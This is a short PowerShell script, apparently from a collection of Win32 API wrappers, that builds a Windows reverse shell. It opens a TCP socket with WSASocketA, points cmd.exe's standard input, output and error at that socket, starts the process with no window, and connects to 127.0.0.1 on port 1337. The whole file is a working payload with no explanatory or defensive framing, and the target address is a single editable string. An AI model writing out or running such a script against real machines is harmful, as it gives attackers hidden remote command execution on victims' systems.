# Depends on ws2_32.dll/WSAStartup.ps1
# Depends on ws2_32.dll/WSASocketA.ps1
# Depends on ws2_32.dll/WSAConnect.ps1
# Depends on ws2_32.dll/htons.ps1
# Depends on ws2_32.dll/inet_addr.ps1
# Depends on kernel32.dll/CreateProcessA.ps1
# Depends on structures/SOCKADDR_IN.ps1
# Depends on structures/WSADATA.ps1
# Depends on structures/STARTUPINFOA.ps1
# Depends on structures/PROCESS_INFORMATION.ps1

$server = [SOCKADDR_IN]::new()

$server.sin_family = 2
$server.sin_port = htons 1337
$server.sin_addr.s_addr = inet_addr "127.0.0.1"

$StartupInfo = [STARTUPINFOA]::new()
$ProcessInfo = [PROCESS_INFORMATION]::new()
$CommandLine = "cmd.exe"

WSAStartup 0x0202 ([WSADATA]::new())
$socket = WSASocketA 2 1 6

$StartupInfo.dwFlags = [STARTUPINFO_FLAGS]::STARTF_USESTDHANDLES
$StartupInfo.hStdInput = $socket
$StartupInfo.hStdOutput = $socket
$StartupInfo.hStdError = $socket

CreateProcessA -lpCommandLine ([ref]$CommandLine) -bInheritHandles $True -dwCreationFlags CREATE_NO_WINDOW -lpStartupInfo $StartupInfo -lpProcessInformation $ProcessInfo

WSAConnect $socket $server $server.Size()
